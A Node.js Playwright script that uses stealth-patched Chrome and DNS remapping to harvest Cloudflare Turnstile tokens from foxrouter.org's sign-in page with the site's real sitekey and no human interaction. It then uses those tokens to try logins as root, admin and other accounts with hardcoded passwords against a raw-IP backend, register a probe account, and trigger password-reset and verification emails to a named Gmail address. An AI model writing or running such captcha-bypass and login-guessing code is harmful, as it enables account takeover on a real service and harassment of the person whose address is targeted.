// 17911 — managed / 免交互 通道专项：4 组变体并列 render 真 sitekey，全程不点击、不碰 iframe
// 目的：判定 600010 是「点击失败」还是「managed 通道本身被拒」
const { chromium } = require('playwright-core');
const fs = require('fs');
const T = process.env.RUNNER_TEMP || '/tmp';
const REAL = '0x4AAAAAAEGBqst_6XV04SLn';
const FR_IPS = ['104.16.148.55', '104.16.157.68', '104.17.246.201', '104.17.121.154', '104.18.45.2'];
const ROUNDS = parseInt(process.env.ROUNDS || '6', 10);
const SECS = parseInt(process.env.SECS || '120', 10);
const CHROME = process.env.CHROME_BIN || '/usr/bin/google-chrome';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36';
const MUA = 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36';
const log = s => { const l = '[' + new Date().toISOString().slice(11, 19) + '] ' + s; console.log(l); try { fs.appendFileSync(T + '/r.log', l + '\n'); } catch (e) {} };
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function submit(tok, tag) {
  const base = 'http://63.141.242.130:3000';
  const run = async (name, url, body) => {
    try {
      const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Origin': 'https://foxrouter.org' }, body: body });
      log(`SUBMIT ${tag} ${name} -> ${r.status} ${(await r.text()).slice(0, 500)}`);
    } catch (e) { log(`SUBMIT ${tag} ${name} ERR ${e}`); }
  };
  const get = async (name, url) => {
    try { const r = await fetch(url, { method: 'GET', headers: { 'Origin': 'https://foxrouter.org' } }); log(`SUBMIT ${tag} ${name} -> ${r.status} ${(await r.text()).slice(0, 500)}`); } catch (e) { log(`SUBMIT ${tag} ${name} ERR ${e}`); }
  };
  for (const u of ['root', 'admin', 'aPG666a']) await run('login_' + u, base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: u, password: 'a2317471' }));
  for (const u of ['admin@admin.com']) await run('login_' + u, base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: u, password: 'a2317471+a' }));
  const n = String(Date.now() % 100000);
  await run('register_probe', base + '/api/user/register?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'p' + n, password: 'Probe12345!', email: 'p' + n + '@example.com' }));
  await get('reset_pw', base + '/api/user/reset_password?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok));
  await get('verify_mail', base + '/api/verification?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok));
}

function hook(page, E) {
  page.on('console', m => { const t = m.text(); if (/ERRCB|TOK|BEFORE|AFTER|600010|110200|execute/.test(t)) log(`[${E()}s C] ${t.slice(0, 140)}`); });
  page.on('pageerror', e => log(`[${E()}s PE] ${String(e).slice(0, 140)}`));
  page.on('response', async r => {
    const u = r.url();
    if (!/challenge-platform\/h\/b\/fo|challenge-platform\/h\/b\/turnstile/.test(u)) return;
    let b = ''; try { b = await r.text(); } catch (e) { b = '<nb>'; }
    log(`[${E()}s R${r.status()} len=${b.length}] ${u.slice(0, 90)}`);
  });
  page.on('requestfailed', r => { if (/challenge|cloudflare/.test(r.url())) log(`[${E()}s FAILED ${r.url().slice(0, 90)} ${(r.failure() || {}).errorText}`); });
}

async function launch(dir, fr, mobile) {
  const args = ['--no-sandbox', '--disable-dev-shm-usage', '--no-proxy-server', '--ignore-certificate-errors',
    '--disable-blink-features=AutomationControlled', '--exclude-switches=enable-automation',
    '--disable-features=ThirdPartyStoragePartitioning,TrackingProtection3pcd,PrivacySandboxSettings4',
    '--host-resolver-rules=' + [
      'MAP foxrouter.org ' + fr,
      'MAP challenges.cloudflare.com 104.18.94.41',
      'MAP brunhild.challenges.cloudflare.com 104.18.8.208',
      'MAP hagen.challenges.cloudflare.com 104.18.9.208',
      'MAP api.foxrouter.org 63.141.242.130'].join(', ')];
  const ctx = await chromium.launchPersistentContext(dir, {
    executablePath: CHROME, headless: false, userAgent: mobile ? MUA : UA,
    viewport: mobile ? { width: 412, height: 915 } : { width: 1280, height: 940 },
    locale: 'en-US', timezoneId: 'America/New_York', ignoreHTTPSErrors: true, args,
    hasTouch: !!mobile, isMobile: !!mobile, deviceScaleFactor: mobile ? 2.6 : 1,
  });
  await ctx.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    window.chrome = window.chrome || { runtime: {} };
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
  });
  return ctx;
}

// 页面内注入 4 组 widget（页面上自有 widget 作为第 0 组对照，只读不点）
const INJECT = `(sk) => {
  const host = document.createElement('div');
  host.id = '__m4';
  host.style.cssText = 'position:fixed;z-index:2147483647;left:0;top:0;width:100%;background:#fff;padding:4px;font:11px monospace';
  document.documentElement.appendChild(host);
  new MutationObserver(() => { if (!document.getElementById('__m4')) document.documentElement.appendChild(host); })
    .observe(document.documentElement, { childList: true });
  window.__ev = {}; window.__tok = {};
  const mk = (id, label) => { const d = document.createElement('div'); d.id = id; d.style.cssText = 'display:inline-block;margin:2px;border:1px solid #888'; host.appendChild(d);
    const s = document.createElement('div'); s.textContent = label; host.appendChild(s); return d; };
  window.__mk = mk;
  window.__ready = false;
  const sc = document.createElement('script');
  sc.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit';
  sc.onload = () => {
    window.__ready = true;
    const opt = (k, extra) => Object.assign({ sitekey: sk,
      callback: t => { window.__tok[k] = t; console.log('TOK:' + k); },
      'error-callback': e => { (window.__ev[k] = window.__ev[k] || []).push(String(e)); console.log('ERRCB:' + k + ':' + e); },
      'before-interactive-callback': () => console.log('BEFORE:' + k),
      'after-interactive-callback': () => console.log('AFTER:' + k) }, extra || {});
    const plan = [
      ['v1', 'V1 default', {}],
      ['v2', 'V2 interaction-only+execute', { appearance: 'interaction-only', execution: 'execute' }],
      ['v3', 'V3 invisible+execute', { size: 'invisible', execution: 'execute' }],
      ['v4', 'V4 mobile-default', {}],
    ];
    window.__ids = {};
    for (const [k, label, extra] of plan) {
      const d = mk('__w' + k, label);
      try { window.__ids[k] = window.turnstile.render(d, opt(k, extra)); } catch (e) { console.log('RENDERERR:' + k + ':' + e); }
    }
    console.log('RENDERED:' + JSON.stringify(window.__ids));
  };
  sc.onerror = () => console.log('APIJS_FAIL');
  document.head.appendChild(sc);
}`;

const snap = page => page.evaluate(() => {
  const out = { tok: {}, ev: {}, frames: [], pageTok: '' };
  try {
    out.tok = Object.assign({}, window.__tok || {});
    for (const k in (window.__ev || {})) out.ev[k] = window.__ev[k].slice(0, 6);
    // 页面上自有 widget（不在 __m4 里）的 token
    const r = [];
    (function w(n) {
      for (const e of n.querySelectorAll('*')) {
        if (e.shadowRoot) w(e.shadowRoot);
        if (e.name === 'cf-turnstile-response' && e.value && !(e.closest && e.closest('#__m4'))) r.push(e.value);
      }
    })(document);
    out.pageTok = r[0] || '';
  } catch (e) { }
  return out;
});

(async () => {
  let got = 0;
  const total = {};
  for (let r = 1; r <= ROUNDS && !got; r++) {
    const dir = T + '/p' + r;
    const ctx = await launch(dir, FR_IPS[(r - 1) % FR_IPS.length], r === 4);
    const page = await ctx.newPage();
    const t0 = Date.now(); const E = () => ((Date.now() - t0) / 1000).toFixed(1);
    hook(page, E);
    const url = 'https://foxrouter.org/sign-in?r=' + Date.now() + Math.random();
    log(`ROUND #${r} ${url}`);
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 45000 }).catch(e => log('GOTO_ERR ' + e.message));
    await sleep(1500);
    await page.evaluate(INJECT, REAL).catch(e => log('INJECT_ERR ' + e.message));
    const deadline = t0 + SECS * 1000;
    let nf = 0;
    while (Date.now() < deadline && !got) {
      await sleep(1000);
      const s = await snap(page).catch(() => null);
      if (!s) continue;
      for (const k in s.ev) for (const e of s.ev[k]) { total[k] = total[k] || {}; total[k][e] = (total[k][e] || 0) + 1; }
      const toks = Object.entries(s.tok).filter(([k, v]) => v);
      if (s.pageTok) toks.push(['page', s.pageTok]);
      if (toks.length) {
        got = 1;
        for (const [k, v] of toks) { log(`TOKEN ${k} len=${v.length} ${v.slice(0, 40)}`); try { fs.appendFileSync(T + '/token_' + k + '.txt', v + '\n'); } catch (e) { } }
        await submit(toks[0][1], toks[0][0]);
        break;
      }
      if ((Date.now() - t0) % 10000 < 1200) {
        nf = await page.evaluate(() => { const f = []; for (const e of document.querySelectorAll('*')) { if (e.shadowRoot) { } } return document.querySelectorAll('#__m4 iframe, iframe').length; }).catch(() => 0);
        const st = await page.evaluate(() => ({ w: !!(window.turnstile), ids: window.__ids || {} })).catch(() => ({}));
        log(`[${E()}s] tick tok=0 frames=${nf} api=${JSON.stringify(st)} ev=${JSON.stringify(s.ev)}`);
      }
    }
    if (!got) {
      const s = await snap(page).catch(() => ({}));
      const body = await page.evaluate(() => { const f = [...document.querySelectorAll('iframe')]; return f.map(x => x.src.slice(0, 60)).join('|'); }).catch(() => '');
      log(`ROUND_END #${r} tok=0 ev=${JSON.stringify(s.ev || {})} iframes=${body}`);
    } else {
      log(`ROUND_END #${r} GOT_TOKEN`);
    }
    await ctx.close().catch(() => { });
  }
  log('SUMMARY ' + JSON.stringify(total));
  log('DONE got=' + got);
})();
